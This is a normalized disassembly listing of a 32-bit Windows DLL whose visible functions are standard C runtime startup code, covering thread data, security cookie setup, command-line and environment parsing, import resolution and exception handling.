jmp r-xdata
sub_10003a2b
push 0x8
push r--data
call sub_10004af0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003acc
push 0xc
call sub_1000507b
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_10005684
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003ad5
call sub_10004b35
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_10003ade
call sub_10003d99
call sub_100051aa
test eax eax
jne r-xdata
push sub_10003837
call sub_100046a0
pop ecx
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call sub_10003b54
xor eax eax
retn
push esi
push 0x3bc
push 0x1
call sub_100049c6
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_10003b54
xor eax eax
pop esi
retn
push esi
push [ rw-data ]
call sub_100046fc
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x0
push esi
call sub_10003a2b
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
pop esi
retn
sub_10003b71
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
leave
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_10003bb9
push esi
push edi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi [ rw-data ]
mov edi eax
test esi esi
je r-xdata
push ebx
push esi
call sub_100031b5
mov esi [ rw-data ]
xor ebx ebx
pop ecx
mov [ rw-data ] ebx
test esi esi
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push esi
call sub_100031b5
push [ rw-data ]
mov [ rw-data ] ebx
call sub_100031b5
push [ rw-data ]
call sub_100031b5
add esp 0xc
mov [ rw-data ] ebx
mov [ rw-data ] ebx
cmp edi 0xffffffff
je r-xdata
cmp [ esi ] ebx
je r-xdata
mov esi [ rw-data ]
push [ esi ]
call sub_100031b5
pop ecx
add esi 0x4
jne r-xdata
push 0xffffffff
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov esi [ rw-data ]
push [ esi ]
call sub_100031b5
pop ecx
add esi 0x4
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call sub_100031b5
pop ecx
mov [ rw-data ] ebx
push edi
call sub_100031b5
pop ecx
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
pop ebx
test eax eax
jne r-xdata
push eax
call sub_100031b5
pop ecx
mov [ rw-data ] ebx
pop edi
pop esi
retn
mov eax [ rw-data ]
mov esi rw-data
cmp eax esi
je r-xdata
push eax
call sub_100031b5
pop ecx
mov [ rw-data ] esi
sub_10003cf4
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_100063eb
push r--data
push r--data
call sub_10003ded
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_100061c0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_10004ac5
call sub_100063d6
pop ecx
mov esi r--data
mov edi r--data
jmp r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
add esi 0x4
call eax
xor eax eax
push rw-data
call sub_100061c0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_10003d99
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_100033ad
push esi
call sub_10005420
push esi
call sub_1000644f
push esi
call sub_1000645c
push esi
call sub_10006476
push esi
call sub_1000643e
add esp 0x18
pop esi
jmp sub_1000475c
sub_10003dd1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_10003ded
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10003e21
push 0x1c
push r--data
call sub_10004af0
push 0x8
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003f3b
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10004b35
retn
mov [ rw-data ] 0x1
push 0x8
call sub_100051df
pop ecx
push [ ebp + 0x8 ]
call sub_10003ba3
push r--data
push r--data
call sub_10003dd1
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_10003dd1
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_10003f6d
push 0x64
push r--data
call sub_10004af0
push 0xb
call sub_1000507b
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_100049c6
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10006690
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_10004b35
retn
mov [ ebp - 0x2c ] ebx
cmp ebx 0x3
jge r-xdata
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10004212
xor eax eax
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp [ esi ] 0xfffffffe
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_100049c6
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
jmp r-xdata
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + ebx * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi 0xfffffffe
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_1000421b
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
cmp edi eax
jae r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call sub_100031b5
and [ esi ] 0x0
pop ecx
add edi 0xc
mov ecx [ esi ]
add edi 0x40
add ecx 0x800
lea eax [ edi - 0xc ]
cmp eax ecx
jb r-xdata
push edi
call [ DeleteCriticalSection@IAT ]
cmp [ edi - 0x4 ] 0x0
je r-xdata
sub_1000426d
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
push edi
push 0x104
mov edi rw-data
xor ebx ebx
push edi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] edi
test esi esi
je r-xdata
call sub_100059d0
mov esi edi
cmp [ esi ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x8 ]
cmp ecx 0xffffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push esi
call sub_1000431e
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea edx [ ecx + ebx * 4 ]
cmp edx ecx
jb r-xdata
push edx
call sub_10004a10
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_1000431e
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] eax
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000431e
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
and [ ebx ] 0x0
mov esi [ ebp + 0x8 ]
mov [ eax ] 0x1
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test eax eax
je r-xdata
xor ecx ecx
mov [ ebp + 0x8 ] ecx
mov [ eax ] edi
add eax 0x4
mov [ ebp + 0xc ] eax
inc [ ebx ]
test edi edi
je r-xdata
xor eax eax
test ecx ecx
sete al
inc esi
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov al 0x22
jmp r-xdata
mov al [ esi ]
mov [ ebp + 0x1b ] al
movzx eax al
push eax
inc esi
call sub_100069a8
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
test ecx ecx
jne r-xdata
mov al [ ebp + 0x1b ]
test al al
je r-xdata
inc [ ebx ]
test edi edi
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x20
je r-xdata
dec esi
mov ecx [ ebp + 0x8 ]
inc esi
mov al [ esi ]
mov [ edi ] al
inc edi
test edi edi
je r-xdata
cmp al 0x9
jne r-xdata
mov edx [ ebp + 0xc ]
pop edi
pop esi
pop ebx
test edx edx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
and [ ebp + 0x18 ] 0x0
mov [ edi - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
pop ebp
retn
and [ edx ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov [ edx ] edi
add edx 0x4
mov [ ebp + 0xc ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test cl 0x1
jne r-xdata
dec ecx
test edi edi
je r-xdata
mov al [ esi ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
inc [ ebx ]
mov [ edi ] 0x5c
inc edi
test edi edi
je r-xdata
cmp [ ebp + 0x18 ] ecx
jne r-xdata
xor eax eax
xor edx edx
cmp [ ebp + 0x18 ] eax
sete al
mov [ ebp + 0x18 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ ebx ]
jmp r-xdata
mov [ edi ] 0x0
inc edi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
call sub_100069a8
pop ecx
test edi edi
je r-xdata
cmp al 0x9
je r-xdata
xor edx edx
inc edx
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebx ]
inc esi
inc [ ebx ]
mov al [ esi ]
mov [ edi ] al
inc edi
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
inc [ ebx ]
sub_1000449a
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_100059d0
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_100049c6
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_10004ff0
inc esi
pop ecx
add esi eax
inc edi
mov esi [ rw-data ]
push ebx
cmp [ esi ] 0x0
je r-xdata
push esi
call sub_100031b5
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
push esi
call sub_10004ff0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
add esi ebx
cmp [ esi ] 0x0
jne r-xdata
push 0x1
push ebx
call sub_100049c6
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_100031b5
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_10004f8d
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10005468
int3
add edi 0x4
sub_1000457b
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
xor ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
leave
retn
sub_10004615
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
xor eax eax
test edi edi
je r-xdata
pop edi
leave
retn
push esi
mov esi edi
cmp [ edi ] ax
je r-xdata
push ebx
push eax
push eax
push eax
sub esi edi
push eax
sar esi 0x1
inc esi
push esi
push edi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_10004a10
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
add esi 0x2
cmp [ esi ] ax
jne r-xdata
xor eax eax
push eax
push eax
push [ ebp - 0x4 ]
push ebx
push esi
push edi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebx
call sub_100031b5
pop ecx
xor ebx ebx
pop ebx
pop esi
sub_100046fc
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_1000471e
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
setg al
pop esi
leave
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_1000475c
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_100049c6
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10006a69
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10004a10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ rw-data ]
xor esi esi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test edi edi
je r-xdata
push esi
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea ecx [ esi + 0x3e8 ]
mov esi ecx
cmp ecx edi
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0x8 ]
call sub_100031ed
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
sub_10004a59
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
mov esi eax
cmp eax [ rw-data ]
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
or esi 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100069be
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10004aa5
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_10004ac5
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_10004af0
push sub_10004b50
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10004b50
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebx + 0x8 ]
xor edi [ rw-data ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
mov eax [ edi ]
lea esi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002b9f
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002b9f
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_100067cb
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
mov ebx [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
add ecx esi
xor ecx [ edx + esi ]
call sub_10002b9f
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002b9f
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_10006782
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_100067b2
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_100067cb
mov eax [ ebp + 0xc ]
push rw-data
call sub_100061c0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x8 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002b9f
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_10006799
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ rw-data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_10002b9f
sub_10004d00
push ebp
mov ebp esp
push esi
call sub_10004ced
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_10004d34
pop ecx
mov esi eax
call sub_10004d21
mov [ eax ] esi
pop esi
pop ebp
retn
sub_10004d34
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
